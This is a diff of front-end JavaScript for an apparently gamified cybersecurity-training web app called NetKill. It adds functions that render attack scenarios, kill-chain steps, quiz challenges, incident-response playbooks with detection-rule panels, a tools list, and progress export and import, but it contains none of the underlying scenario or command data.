+  document.getElementById('scenGrid').innerHTML=data.map(s=>{const done=ST.done.includes(s.id);return '<div class="sc-card'+(done?' done':'')+'" onclick="openScen(\''+s.id+'\')"><div class="sc-top"><span class="sc-id">'+s.id+'</span>'+(done?'<span class="sc-badge">✓ CLEARED</span>':'')+'</div><div class="sc-name">'+s.name+'</div><div class="sc-desc">'+s.desc+'</div><div class="sc-tags">'+s.tactics.map(t=>'<span class="tag tag-t">'+t+'</span>').join('')+s.tools.slice(0,2).map(t=>'<span class="tag tag-tool">'+t+'</span>').join('')+'</div><div class="sc-foot"><span class="stars d'+s.diff+'">'+'★'.repeat(s.diff)+'☆'.repeat(5-s.diff)+'</span><span class="dur">⏱ '+s.dur+'</span></div><div class="sc-bar"></div></div>';}).join('');
+}
+function filterTactic(t,btn){ST.tactic=t;document.querySelectorAll('.f-btn').forEach(b=>b.classList.remove('on'));btn.classList.add('on');renderScen();}
+function filterScen(q){ST.search=q.replace(/</g,'').replace(/>/g,'').replace(/"/g,'').replace(/'/g,'');renderScen();}
+function fmtCmds(cmds){return cmds.map(cmd=>cmd.split('\n').map(line=>{if(line.startsWith('#'))return'<div class="t-cmt">'+line+'</div>';if(line.trim())return'<div><span class="t-prompt">$ </span><span class="t-cmd">'+line+'</span></div>';return'<div></div>';}).join('')).join('<br>');}
+function openScen(id){
+  const s=SCEN.find(x=>x.id===id);if(!s)return;
+  const done=ST.done.includes(s.id);
+  document.getElementById('scen-list').style.display='none';
+  const det=document.getElementById('scen-detail');det.style.display='block';
+  det.innerHTML='<button class="back-btn" onclick="closeScen()">← Back to Scenarios</button><div class="det-hdr"><div class="det-title">'+s.id+' — '+s.name+'</div><div class="det-meta"><span class="stars d'+s.diff+'">'+'★'.repeat(s.diff)+'☆'.repeat(5-s.diff)+'</span>'+s.tactics.map(t=>'<span class="tag tag-t">'+t+'</span>').join('')+'<span class="tag" style="background:rgba(255,170,0,.08);border:1px solid rgba(255,170,0,.25);color:var(--amber)">⏱ '+s.dur+'</span></div><div class="det-desc">'+s.desc+'</div></div><div class="det-grid"><div class="kc-panel"><div class="kc-lbl">Kill Chain Steps</div>'+s.techs.map((t,i)=>'<div class="kc-step'+(i===0?' open':'')+'" id="kcs'+i+'"><div class="kc-hdr" onclick="toggleKC('+i+')"><div class="kc-num">'+(i+1)+'</div><div class="kc-sname">'+t.name+'</div><div class="kc-tid">'+t.id+'</div></div><div class="kc-body"><div class="kc-sdesc">'+t.desc+'</div><div class="term"><div class="term-bar"><div class="td td-r"></div><div class="td td-y"></div><div class="td td-g"></div><span class="term-ttl">ATTACK CONSOLE — '+t.id+'</span></div><div class="term-body">'+fmtCmds(t.cmds)+'</div></div></div></div>').join('')+'</div><div class="side-col"><div class="info-box"><div class="ib-title">MITRE ATT&CK Techniques</div>'+s.techs.map(t=>'<div class="mit-row"><span class="mit-id">'+t.id+'</span><span class="mit-name">'+t.name+'</span></div>').join('')+'</div><div class="info-box"><div class="ib-title">Tools Used</div>'+s.tools.map(t=>'<span class="tchip">⚙ '+t+'</span>').join('')+'</div><div class="info-box"><div class="ib-title">Detection &amp; Defense</div>'+s.defense.map(d=>'<div class="def-row">'+d+'</div>').join('')+'</div><button class="done-btn'+(done?' cleared':'')+'" onclick="markDone(\''+s.id+'\')">'+( done?'✓ MISSION CLEARED':'◎ MARK COMPLETE +200 XP')+'</button></div></div>';
+}
+function openScenById(id){showView('scenarios');setTimeout(()=>openScen(id),60);}
+function closeScen(){document.getElementById('scen-list').style.display='block';document.getElementById('scen-detail').style.display='none';}
+function toggleKC(idx){const el=document.getElementById('kcs'+idx);const was=el.classList.contains('open');document.querySelectorAll('.kc-step').forEach(s=>s.classList.remove('open'));if(!was)el.classList.add('open');}
+function markDone(id){if(!ST.done.includes(id)){ST.done.push(id);save();showToast('Mission cleared! +200 XP','success');renderDash();}const btn=document.querySelector('.done-btn');if(btn){btn.textContent='✓ MISSION CLEARED';btn.classList.add('cleared');}}
+function renderArena(){
+  document.getElementById('arenaGrid').innerHTML=CHALS.map(c=>{const s=ST.solved.includes(c.id);return '<div class="ch-card'+(s?' solved':'')+'" onclick="openChal(\''+c.id+'\')"><div class="ch-type '+c.type+'">'+c.type.toUpperCase()+'</div><div class="ch-name">'+c.id+' · '+c.name+'</div><div class="ch-desc">'+c.desc+'</div><div class="ch-foot"><span class="ch-pts">◈ '+c.pts+' XP</span><span style="font-size:10px;font-family:var(--fm);color:'+(s?'var(--green)':'var(--text3)')+'">'+( s?'✓ SOLVED':'○ UNSOLVED')+'</span></div></div>';}).join('');
+}
+function openChal(id){
+  const c=CHALS.find(x=>x.id===id);if(!c)return;
+  const s=ST.solved.includes(c.id);
+  document.getElementById('modalBody').innerHTML='<div class="m-type ch-type '+c.type+'">'+c.type.toUpperCase()+'</div><div class="m-title">'+c.id+' — '+c.name+'</div><div class="ev-lbl">Evidence / Log Data</div><div class="ev-block">'+c.ev+'</div><div class="q-text">'+c.q+'</div><div class="opts" id="opts">'+c.opts.map((o,i)=>'<button class="opt'+(s&&i===c.ans?' correct':'')+'" onclick="answer(\''+c.id+'\','+i+')" '+(s?'disabled':'')+'>'+String.fromCharCode(65+i)+'. '+o+'</button>').join('')+'</div><div class="exp'+(s?' show':'')+'" id="exp"><div class="exp-lbl">Analyst Explanation</div>'+c.exp+'</div>';
+  document.getElementById('modal').classList.add('open');
+}
+function answer(cid,chosen){
+  const c=CHALS.find(x=>x.id===cid);if(!c||ST.solved.includes(cid))return;
+  document.querySelectorAll('.opt').forEach((b,i)=>{b.disabled=true;if(i===c.ans)b.classList.add('correct');else if(i===chosen)b.classList.add('wrong');});
+  document.getElementById('exp').classList.add('show');
+  if(chosen===c.ans){ST.solved.push(cid);save();renderDash();renderArena();showToast('Correct! +'+c.pts+' XP','success');}
+  else showToast('Incorrect — review the explanation','info');
+}
+function closeModal(){document.getElementById('modal').classList.remove('open');}
+function renderIR(){
+  document.getElementById('irGrid').innerHTML=IR_PB.map(p=>{
+    const phases=Object.keys(p.phases).filter(k=>k!=='snort'&&k!=='sigma');
+    const total=phases.reduce((a,k)=>a+p.phases[k].length,0);
+    const done=(ST.irChecks[p.id]||[]).length;
+    const pct=total?Math.round((done/total)*100):0;
+    return '<div class="ir-card" onclick="openIR(\''+p.id+'\')"><div class="ir-ph">'+p.ph+'</div><div class="ir-name">'+p.name+'</div><div class="ir-desc">'+p.desc+'</div><div class="ir-foot"><span class="ir-prog">'+done+'/'+total+' steps</span><div class="ir-pbar"><div class="ir-pfill" style="width:'+pct+'%"></div></div><span class="ir-prog">'+pct+'%</span></div></div>';
+  }).join('');
+}
+function openIR(id){
+  const p=IR_PB.find(x=>x.id===id);if(!p)return;
+  const phases=Object.entries(p.phases).filter(([k])=>k!=='snort'&&k!=='sigma');
+  const tabNames=phases.map(([k])=>k);
+  const tabs=[...tabNames,'Detection Rules'];
+  document.getElementById('modalBody').innerHTML='<div class="m-type" style="color:var(--blue)">IR PLAYBOOK</div><div class="m-title">'+p.name+'</div><div class="ir-tabs" id="irTabs">'+tabs.map((t,i)=>'<div class="ir-tab'+(i===0?' active':'')+'" onclick="switchIRTab('+i+')">'+t+'</div>').join('')+'</div>'+phases.map(([ph,steps],i)=>'<div class="ir-pc'+(i===0?' show':'')+'" id="irpc'+i+'">'+steps.map((step,si)=>{const key=id+'-'+ph+'-'+si;const ck=(ST.irChecks[id]||[]).includes(key);return'<div class="ir-step"><div class="ir-step-title">'+ph+' — Step '+(si+1)+'</div><ul class="ir-cl"><li class="'+(ck?'ck':'')+'" onclick="toggleIRStep(\''+id+'\',\''+ph+'\','+si+',\''+key+'\',this)">'+step+'</li></ul></div>';}).join('')+'</div>').join('')+'<div class="ir-pc" id="irpc'+phases.length+'"><div class="ir-step"><div class="ir-step-title">Snort / Suricata Rule</div><div class="rule-block rule-snort">'+p.snort+'</div></div><div class="ir-step"><div class="ir-step-title">Sigma Detection Rule (SIEM)</div><div class="rule-block rule-sigma">'+p.sigma+'</div></div></div>';
+  document.getElementById('modal').classList.add('open');
+}
+function switchIRTab(idx){document.querySelectorAll('.ir-tab').forEach((t,i)=>t.classList.toggle('active',i===idx));document.querySelectorAll('.ir-pc').forEach((c,i)=>c.classList.toggle('show',i===idx));}
+function toggleIRStep(pid,phase,si,key,el){if(!ST.irChecks[pid])ST.irChecks[pid]=[];const idx=ST.irChecks[pid].indexOf(key);if(idx>-1)ST.irChecks[pid].splice(idx,1);else ST.irChecks[pid].push(key);save();renderDash();renderIR();el.classList.toggle('ck');showToast(el.classList.contains('ck')?'Step completed +10 XP':'Step unchecked','info');}
+function renderSkillMap(){
+  document.getElementById('smGrid').innerHTML=TACTICS.map(sk=>{const rel=SCEN.filter(s=>s.tactics.includes(sk.t));const done=rel.filter(s=>ST.done.includes(s.id));const pct=rel.length?Math.round((done.length/rel.length)*100):0;return'<div class="sk-card"><div class="sk-tactic" style="color:'+sk.c+'">'+sk.t+'</div><div class="sk-name">'+sk.t+'</div><div class="sk-bar-row"><div class="sk-bar"><div class="sk-fill" style="width:'+pct+'%;background:'+sk.c+'"></div></div><span class="sk-pct">'+pct+'%</span></div><div class="sk-techs">'+sk.techs.join(' · ')+'</div></div>';}).join('');
+}
+function renderTools(cat='all'){
+  const cats=[...new Set(TOOLS.map(t=>t.cat))];
+  document.getElementById('toolsFilter').innerHTML='<button class="f-btn'+(cat==='all'?' on':'')+'" onclick="renderTools(\'all\')">ALL</button>'+cats.map(c=>'<button class="f-btn'+(cat===c?' on':'')+'" onclick="renderTools(\''+c+'\')">'+c.toUpperCase()+'</button>').join('');
+  const data=cat==='all'?TOOLS:TOOLS.filter(t=>t.cat===cat);
+  document.getElementById('toolsGrid').innerHTML=data.map(t=>'<div class="tool-card"><div class="tool-name">'+t.n+'</div><div class="tool-cat">'+t.cat+'</div><div class="tool-desc">'+t.d+'</div><div class="tool-cmd">'+t.cmd+'</div></div>').join('');
+}
+function showView(id){
+  if(id==='hunt'){setTimeout(renderHunt,10);}
+  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
+  document.getElementById('view-'+id).classList.add('active');
+  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.toggle('active',b.getAttribute('onclick')&&b.getAttribute('onclick').includes("'"+id+"'")));
+  if(id==='dashboard')renderDash();
+  else if(id==='scenarios'){renderScen();closeScen();}
+  else if(id==='arena')renderArena();
+  else if(id==='ir')renderIR();
+  else if(id==='skillmap')renderSkillMap();
+  else if(id==='tools')renderTools();
 }
 
-function addLog(type,msg){
-  if(!msg)return;
-  const log=document.getElementById('logBody');
-  const el=document.createElement('div');
-  el.className=`log-e ${type}`;
-  el.textContent=`[${new Date().toTimeString().slice(0,8)}] ${msg}`;
-  log.appendChild(el);log.scrollTop=log.scrollHeight;
-  while(log.children.length>25)log.removeChild(log.firstChild);
+function exportProgress(){
+  const data={done:ST.done,solved:ST.solved,irChecks:ST.irChecks,hunts:ST_HUNT.hunts,version:'nk3'};
+  const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
+  const a=document.createElement('a');a.href=URL.createObjectURL(blob);
+  a.download='netkill-progress-'+new Date().toISOString().slice(0,10)+'.json';
+  a.click();showToast('Progress exported!','success');
 }
-
-window.addEventListener('load',()=>{resizeCv();renderList();draw();});
+function importProgress(){
+  const input=document.createElement('input');input.type='file';input.accept='.json';
+  input.onchange=e=>{
+    const fr=new FileReader();fr.onload=r=>{
+      try{
+        const data=JSON.parse(r.target.result);
+        if(data.version&&data.version.startsWith('nk')){
+          if(data.done)ST.done=data.done;
+          if(data.solved)ST.solved=data.solved;
+          if(data.irChecks)ST.irChecks=data.irChecks;
+          if(data.hunts)ST_HUNT.hunts=data.hunts;
+          save();saveHunt();renderDash();renderScen();renderArena();renderIR();
+          showToast('Progress imported successfully!','success');
+        }else{showToast('Invalid progress file','info');}
+      }catch(err){showToast('Failed to parse file','info');}
+    };fr.readAsText(e.target.files[0]);
+  };input.click();
+}
+function showToast(msg,type){const t=document.getElementById('toast');t.textContent=msg;t.className='toast '+type+' show';clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('show'),3000);}
+(function(){renderDash();renderScen();document.getElementById('modal').addEventListener('click',function(e){if(e.target===this)closeModal();});})();
 </script>
 </body>
 </html>
